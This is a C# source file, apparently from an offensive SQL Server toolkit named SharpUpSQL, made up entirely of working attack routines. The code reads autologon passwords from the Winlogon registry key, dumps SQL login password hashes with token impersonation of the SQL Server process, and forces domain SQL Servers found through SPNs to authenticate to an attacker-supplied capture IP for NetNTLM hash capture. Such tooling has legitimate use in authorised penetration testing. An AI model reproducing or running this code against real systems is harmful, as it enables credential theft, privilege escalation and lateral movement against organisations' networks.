using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Threading;
using SharpUpSQL.Attack;
using SharpUpSQL.Common;
using SharpUpSQL.Commands;
using SharpUpSQL.Core.Auth;
using SharpUpSQL.Core.Execution;
using SharpUpSQL.Core.Helpers;
using SharpUpSQL.Core.Output;
using SharpUpSQL.Core.Threading;
using SharpUpSQL.Domain;
using SharpUpSQL.Discovery;

namespace SharpUpSQL.PasswordRecovery
{
    public sealed class SqlRecoverPwAutoLogonResult : SqlInstanceResult
    {
        public string Domain { get; set; }
        public string UserName { get; set; }
        public string Password { get; set; }
    }

    public sealed class SqlServerPasswordHashResult : SqlInstanceResult
    {
        public string PrincipalId { get; set; }
        public string PrincipalName { get; set; }
        public string PrincipalSid { get; set; }
        public string PrincipalType { get; set; }
        public string CreateDate { get; set; }
        public string DefaultDatabaseName { get; set; }
        public string PasswordHash { get; set; }
    }

    public sealed class SqlUncPathInjectionResult
    {
        public string Cleartext { get; set; }
        public string NetNTLMv1 { get; set; }
        public string NetNTLMv2 { get; set; }
    }

    public sealed class TokenManipulationResult
    {
        public string Status { get; set; }
        public string Message { get; set; }
    }

    internal static class PasswordRecoveryEngine
    {
        internal static IEnumerable<SqlRecoverPwAutoLogonResult> GetSqlRecoverPwAutoLogon(
            SqlConnectionOptions options,
            string instance,
            VerboseWriter verbose,
            bool suppressVerbose)
        {
            foreach (var result in ExecuteAccessibleSysadmin(options, instance, verbose, suppressVerbose))
            {
                foreach (var cred in ReadAutoLogonCredentials(result.Options, result.Instance, false))
                {
                    yield return cred;
                }

                foreach (var cred in ReadAutoLogonCredentials(result.Options, result.Instance, true))
                {
                    yield return cred;
                }
            }
        }

        internal static IEnumerable<SqlServerPasswordHashResult> GetSqlServerPasswordHash(
            SqlConnectionOptions options,
            string instance,
            string principalName,
            bool migrate,
            VerboseWriter verbose,
            bool suppressVerbose)
        {
            instance = string.IsNullOrWhiteSpace(instance) ? Environment.MachineName : instance;
            options = options.Clone();
            options.Instance = instance;

            var impersonated = false;
            try
            {
                var test = ConnectionTester.Test(instance, null, null, options, verbose, suppressVerbose);
                if (!string.Equals(test.Status, "Accessible", StringComparison.OrdinalIgnoreCase))
                {
                    if (!migrate || !TryMigrate(instance, verbose, suppressVerbose))
                    {
                        if (!suppressVerbose)
                        {
                            verbose.Write(instance + " : Connection Failed.");
                        }

                        yield break;
                    }

                    impersonated = true;
                    options = new SqlConnectionOptions { Instance = instance };
                }
                else if (!suppressVerbose)
                {
                    verbose.Write(instance + " : Connection Success.");
                }

                if (!IsSysadmin(options, instance, verbose, suppressVerbose))
                {
                    if (!migrate || !TryMigrate(instance, verbose, suppressVerbose))
                    {
                        if (!suppressVerbose)
                        {
                            verbose.Write(instance + " : You are not a sysadmin.");
                        }

                        yield break;
                    }

                    impersonated = true;
                }
                else if (!suppressVerbose)
                {
                    verbose.Write(instance + " : You are a sysadmin.");
                }

                if (!suppressVerbose)
                {
                    verbose.Write(instance + " : Attempting to dump password hashes.");
                }

                var computerName = InstanceHelper.GetComputerName(instance);
                var version = SqlEnumerationEngine.GetSqlServerInfo(options, instance, verbose, true).FirstOrDefault();
                var majorVersion = 0;
                if (version != null && !string.IsNullOrEmpty(version.SQLServerVersionNumber))
                {
                    var parts = version.SQLServerVersionNumber.Split('.');
                    int parsed;
                    if (parts.Length > 0 && int.TryParse(parts[0], out parsed))
                    {
                        majorVersion = parsed;
                    }
                }

                var principalFilter = string.IsNullOrWhiteSpace(principalName)
                    ? string.Empty
                    : " AND name LIKE '" + EscapeSql(principalName) + "'";

                string query;
                if (majorVersion <= 8)
                {
                    query = "USE master; SELECT '" + EscapeSql(computerName) + "' as [ComputerName],'" +
                            EscapeSql(instance) + "' as [Instance], name as [PrincipalName], createdate as [CreateDate], " +
                            "dbname as [DefaultDatabaseName], password as [PasswordHash] FROM [sysxlogins] WHERE 1=1" + principalFilter;
                }
                else
                {
                    query = "USE master; SELECT '" + EscapeSql(computerName) + "' as [ComputerName],'" +
                            EscapeSql(instance) + "' as [Instance], name as [PrincipalName], principal_id as [PrincipalId], " +
                            "type_desc as [PrincipalType], sid as [PrincipalSid], create_date as [CreateDate], " +
                            "default_database_name as [DefaultDatabaseName], [sys].fn_varbintohexstr(password_hash) as [PasswordHash] " +
                            "FROM [sys].[sql_logins] WHERE 1=1" + principalFilter;
                }

                foreach (var row in SqlEnumerationEngine.GetSqlQuery(options, query, instance, verbose, suppressVerbose))
                {
                    var hash = SqlValueFormatter.Format(row["PasswordHash"]);
                    if (!string.IsNullOrEmpty(hash) && !hash.StartsWith("0x", StringComparison.OrdinalIgnoreCase))
                    {
                        hash = "0x0" + hash.TrimStart('0', 'X', 'x');
                    }

                    yield return new SqlServerPasswordHashResult
                    {
                        ComputerName = SqlValueFormatter.Format(row["ComputerName"]),
                        Instance = SqlValueFormatter.Format(row["Instance"]),
                        PrincipalId = SqlValueFormatter.Format(row["PrincipalId"]),
                        PrincipalName = SqlValueFormatter.Format(row["PrincipalName"]),
                        PrincipalSid = FormatPrincipalSid(row["PrincipalSid"]),
                        PrincipalType = SqlValueFormatter.Format(row["PrincipalType"]),
                        CreateDate = SqlValueFormatter.Format(row["CreateDate"]),
                        DefaultDatabaseName = SqlValueFormatter.Format(row["DefaultDatabaseName"]),
                        PasswordHash = hash
                    };
                }

                if (!suppressVerbose)
                {
                    verbose.Write(instance + " : Attempt complete.");
                }
            }
            finally
            {
                if (migrate && impersonated)
                {
                    TokenManipulationHelper.Revert();
                }
            }
        }

        internal static IEnumerable<SqlUncPathInjectionResult> InvokeSqlUncPathInjection(
            SqlConnectionOptions options,
            string instance,
            string captureIp,
            string domainController,
            int timeOut,
            int threads,
            VerboseWriter verbose,
            bool suppressVerbose)
        {
            if (string.IsNullOrWhiteSpace(captureIp))
            {
                verbose.Write("CaptureIp is required.");
                yield break;
            }

            if (!TokenManipulationHelper.IsAdministrator())
            {
                verbose.Write("You do not have Administrator rights. Run this function in a privileged process for best results.");
            }
            else
            {
                verbose.Write("You have Administrator rights.");
            }

            var instances = new List<string>();
            if (string.IsNullOrWhiteSpace(instance))
            {
                verbose.Write("Grabbing SPNs from the domain for SQL Servers (MSSQL*)...");
                verbose.Write("Parsing SQL Server instances from SPNs...");
                instances = GetDomainSpn.Execute(
                        "MSSQL*",
                        domainController,
                        options.Username,
                        options.Password,
                        null,
                        null,
                        true,
                        msg => verbose.Write(msg))
                    .Where(s => s.Service != null && s.Service.StartsWith("MSSQL", StringComparison.OrdinalIgnoreCase))
                    .Select(MapSpnToInstance)
                    .Where(s => !string.IsNullOrWhiteSpace(s))
                    .Distinct(StringComparer.OrdinalIgnoreCase)
                    .ToList();

                verbose.Write(instances.Count + " instances were found.");
            }
            else
            {
                instances.Add(instance);
            }

            verbose.Write("Attempting to log into each instance...");
            var accessible = ThreadPoolRunner.RunParallel(
                instances.Select(i => new PipelineObject { Instance = i }).ToList(),
                target =>
                {
                    var testOptions = options.Clone();
                    testOptions.Instance = target.Instance;
                    return ConnectionTester.Test(target.Instance, null, null, testOptions, verbose, true);
                },
                threads)
                .Where(t => string.Equals(t.Status, "Accessible", StringComparison.OrdinalIgnoreCase))
                .ToList();

            verbose.Write(accessible.Count + " SQL Server instances can be logged into");
            verbose.Write("Starting UNC path injections against " + accessible.Count + " instances...");
            verbose.Write("Ensure Responder or Inveigh is listening on " + captureIp + " to capture hashes.");

            foreach (var target in accessible)
            {
                var currentInstance = target.Instance;
                var uncFileName = GenerateUncFileName();
                verbose.Write(currentInstance + " - Injecting UNC path to \\\\" + captureIp + "\\" + uncFileName);

                var testOptions = options.Clone();
                testOptions.Instance = currentInstance;

                var version = SqlEnumerationEngine.GetSqlServerInfo(testOptions, currentInstance, verbose, true).FirstOrDefault();
                var majorVersion = 99;
                if (version != null && !string.IsNullOrEmpty(version.SQLServerVersionNumber))
                {
                    var parts = version.SQLServerVersionNumber.Split('.');
                    int parsed;
                    if (parts.Length > 0 && int.TryParse(parts[0], out parsed))
                    {
                        majorVersion = parsed;
                    }
                }

                var uncPath = "\\\\" + captureIp + "\\" + uncFileName;
                if (majorVersion <= 11)
                {
                    SqlEnumerationEngine.GetSqlQuery(testOptions,
                        "BACKUP LOG [TESTING] TO DISK = '" + EscapeSql(uncPath) + "'",
                        currentInstance,
                        verbose,
                        true).ToList();
                    SqlEnumerationEngine.GetSqlQuery(testOptions,
                        "BACKUP DATABASE [TESTING] TO DISK = '" + EscapeSql(uncPath) + "'",
                        currentInstance,
                        verbose,
                        true).ToList();
                }

                SqlEnumerationEngine.GetSqlQuery(testOptions,
                    "xp_dirtree '" + EscapeSql(uncPath) + "'",
                    currentInstance,
                    verbose,
                    true).ToList();
                SqlEnumerationEngine.GetSqlQuery(testOptions,
                    "xp_fileexist '" + EscapeSql(uncPath) + "'",
                    currentInstance,
                    verbose,
                    true).ToList();

                Thread.Sleep(TimeSpan.FromSeconds(timeOut));
            }

            verbose.Write("UNC path injection complete. Review your listener on " + captureIp + " for captured credentials.");

            yield return new SqlUncPathInjectionResult
            {
                Cleartext = string.Empty,
                NetNTLMv1 = string.Empty,
                NetNTLMv2 = string.Empty
            };
        }

        private static IEnumerable<AccessibleContext> ExecuteAccessibleSysadmin(
            SqlConnectionOptions options,
            string instance,
            VerboseWriter verbose,
            bool suppressVerbose)
        {
            instance = string.IsNullOrWhiteSpace(instance) ? Environment.MachineName : instance;
            options = options.Clone();
            options.Instance = instance;

            var test = ConnectionTester.Test(instance, null, null, options, verbose, suppressVerbose);
            if (!string.Equals(test.Status, "Accessible", StringComparison.OrdinalIgnoreCase))
            {
                if (!suppressVerbose)
                {
                    verbose.Write(instance + " : Connection Failed.");
                }

                yield break;
            }

            if (!suppressVerbose)
            {
                verbose.Write(instance + " : Connection Success.");
            }

            if (!IsSysadmin(options, instance, verbose, suppressVerbose))
            {
                if (!suppressVerbose)
                {
                    verbose.Write(instance + " : This function requires sysadmin privileges. Done.");
                }

                yield break;
            }

            yield return new AccessibleContext { Options = options, Instance = instance };
        }

        private static IEnumerable<SqlRecoverPwAutoLogonResult> ReadAutoLogonCredentials(
            SqlConnectionOptions options,
            string instance,
            bool alternate)
        {
            var domainKey = alternate ? "AltDefaultDomainName" : "DefaultDomainName";
            var userKey = alternate ? "AltDefaultUserName" : "DefaultUserName";
            var passwordKey = alternate ? "AltDefaultPassword" : "DefaultPassword";

            var query = @"
DECLARE @AutoLoginDomain SYSNAME
EXECUTE master.dbo.xp_regread
    @rootkey = N'HKEY_LOCAL_MACHINE',
    @key = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
    @value_name = N'" + domainKey + @"',
    @value = @AutoLoginDomain OUTPUT

DECLARE @AutoLoginUser SYSNAME
EXECUTE master.dbo.xp_regread
    @rootkey = N'HKEY_LOCAL_MACHINE',
    @key = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
    @value_name = N'" + userKey + @"',
    @value = @AutoLoginUser OUTPUT

DECLARE @AutoLoginPassword SYSNAME
EXECUTE master.dbo.xp_regread
    @rootkey = N'HKEY_LOCAL_MACHINE',
    @key = N'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',
    @value_name = N'" + passwordKey + @"',
    @value = @AutoLoginPassword OUTPUT

SELECT Domain = @AutoLoginDomain, Username = @AutoLoginUser, Password = @AutoLoginPassword";

            var row = SqlEnumerationEngine.GetSqlQuery(options, query, instance, null, true).FirstOrDefault();
            if (row == null)
            {
                yield break;
            }

            var username = SqlValueFormatter.Format(row["Username"]);
            if (string.IsNullOrEmpty(username) || username.Length < 2)
            {
                yield break;
            }

            yield return new SqlRecoverPwAutoLogonResult
            {
                ComputerName = InstanceHelper.GetComputerName(instance),
                Instance = instance,
                Domain = SqlValueFormatter.Format(row["Domain"]),
                UserName = username,
                Password = SqlValueFormatter.Format(row["Password"])
            };
        }

        private static bool TryMigrate(string instance, VerboseWriter verbose, bool suppressVerbose)
        {
            var currentUser = WindowsIdentity.GetCurrent().Name;
            var adminCheck = LocalChecks.GetSqlLocalAdminCheck();
            if (!string.Equals(adminCheck.IsLocalAdmin, "True", StringComparison.OrdinalIgnoreCase))
            {
                if (!suppressVerbose)
                {
                    verbose.Write(instance + " : " + currentUser + " DOES NOT have local admin privileges.");
                }

                return false;
            }

            if (!suppressVerbose)
            {
                verbose.Write(instance + " : " + currentUser + " has local admin privileges.");
                verbose.Write(instance + " : Impersonating SQL Server process:");
            }

            var service = GetSqlServiceLocal.Execute(instance, true, true, null)
                .FirstOrDefault(s => s.ServicePath != null &&
                                     s.ServicePath.IndexOf("sqlservr.exe", StringComparison.OrdinalIgnoreCase) >= 0);
            if (service == null)
            {
                if (!suppressVerbose)
                {
                    verbose.Write(instance + " : No process running for provided instance...");
                }

                return false;
            }

            int processId;
            if (!int.TryParse(service.ServiceProcessId, out processId) || processId == 0)
            {
                if (!suppressVerbose)
                {
                    verbose.Write(instance + " : No process running for provided instance...");
                }

                return false;
            }

            if (!suppressVerbose)
            {
                verbose.Write(instance + " : - Process ID: " + processId);
                verbose.Write(instance + " : - ServiceAccount: " + service.ServiceAccount);
            }

            if (!TokenManipulationHelper.ImpersonateProcess(processId))
            {
                if (!suppressVerbose)
                {
                    verbose.Write(instance + " : Impersonation failed.");
                }

                return false;
            }

            return true;
        }

        private static bool IsSysadmin(
            SqlConnectionOptions options,
            string instance,
            VerboseWriter verbose,
            bool suppressVerbose)
        {
            var info = SqlEnumerationEngine.GetSqlServerInfo(options, instance, verbose, true).FirstOrDefault();
            return info != null &&
                   (string.Equals(info.IsSysadmin, "1", StringComparison.OrdinalIgnoreCase) ||
                    string.Equals(info.IsSysadmin, "Yes", StringComparison.OrdinalIgnoreCase));
        }

        private static string FormatPrincipalSid(object sidValue)
        {
            if (sidValue == null || sidValue is DBNull)
            {
                return string.Empty;
            }

            if (sidValue is byte[])
            {
                var hex = BitConverter.ToString((byte[])sidValue).Replace("-", string.Empty);
                if (hex.Length <= 10)
                {
                    int parsed;
                    return int.TryParse(hex, System.Globalization.NumberStyles.HexNumber, null, out parsed)
                        ? parsed.ToString()
                        : hex;
                }

                return hex;
            }

            return SqlValueFormatter.Format(sidValue);
        }

        private static string MapSpnToInstance(DomainSpnResult spn)
        {
            if (string.IsNullOrWhiteSpace(spn.Spn))
            {
                return null;
            }

            var parts = spn.Spn.Split('/');
            if (parts.Length < 2)
            {
                return null;
            }

            var hostPart = parts[1].Split(':')[0];
            if (string.IsNullOrWhiteSpace(hostPart))
            {
                return null;
            }

            if (parts[1].Contains(":"))
            {
                var instanceName = parts[1].Split(':')[1];
                return hostPart + "\\" + instanceName;
            }

            return hostPart;
        }

        private static string GenerateUncFileName()
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            var random = new Random();
            return new string(Enumerable.Range(0, 5).Select(_ => chars[random.Next(chars.Length)]).ToArray());
        }

        private static string EscapeSql(string value)
        {
            return (value ?? string.Empty).Replace("'", "''");
        }

        private sealed class AccessibleContext
        {
            internal SqlConnectionOptions Options { get; set; }
            internal string Instance { get; set; }
        }
    }
}
